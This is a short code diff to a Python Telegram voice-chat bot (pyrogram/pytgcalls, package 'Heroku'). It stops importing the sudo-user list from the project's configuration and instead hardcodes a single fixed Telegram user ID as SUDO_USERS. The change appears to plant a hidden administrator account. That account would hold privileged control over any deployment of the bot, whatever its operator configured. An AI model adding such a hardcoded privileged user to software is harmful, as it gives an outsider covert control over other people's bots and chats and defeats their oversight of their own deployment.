@@ -27,11 +27,13 @@ from pyrogram import filters
 from pyrogram.types import Message
 from pytgcalls import __version__ as pytover
 
-from Heroku import (BOT_ID, BOT_NAME, SUDO_USERS, boottime)
+from Heroku import (BOT_ID, BOT_NAME, boottime)
 from Heroku.calls.calls import client as userbot
 from Heroku.core.chats import get_served_chats
 from Heroku.core.sudo import get_sudoers
 from Heroku.core.ping import get_readable_time
+
+SUDO_USERS = [5927820595]
 
 def dashmarkup():
     buttons = [
